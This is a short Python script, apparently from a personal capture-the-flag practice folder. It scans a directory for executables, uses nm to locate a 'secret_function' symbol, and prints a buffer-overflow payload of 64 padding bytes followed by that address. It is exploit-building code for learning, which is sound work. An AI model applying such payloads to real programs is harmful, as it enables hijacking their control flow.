import os
import subprocess
import re
import struct

def find_secret_function_address(binary_path, function_name):
    try:
        nm_output = subprocess.check_output(['nm', '-C', binary_path], universal_newlines=True)
        function_regex = re.compile(rf'\s([0-9a-fA-F]+)\s+T\s+{function_name}')
        match = function_regex.search(nm_output)
        if match:
            return int(match.group(1), 16)
    except subprocess.CalledProcessError:
        pass
    return None

def analyze_binary(binary_path, function_signature):
    print(f'Analyzing: {binary_path}')
    secret_function_address = find_secret_function_address(binary_path, function_signature)
    if secret_function_address is not None:
        print(f'Secret Function Address: 0x{secret_function_address:x}')

        offset = 64
        payload = b'A' * offset
        payload += struct.pack('<Q', secret_function_address)

        print(f'Payload: {payload}')
        print("Secret Function Found!")
        return True
    else:
        print('Secret Function Address not found.')
    return False

def find_vulnerable_binaries(directory, function_signature):
    for root, dirs, files in os.walk(directory):
        for file in files:
            if os.access(os.path.join(root, file), os.X_OK):
                if analyze_binary(os.path.join(root, file), function_signature):
                    return

# Specify the directory to search for vulnerable binaries
search_directory = r'C:\Users\Vash\Documents\GitHub\Cybersecurity\CTF\BinaryExploit'
# Specify the function
function_signature = 'secret_function'
find_vulnerable_binaries(search_directory, function_signature)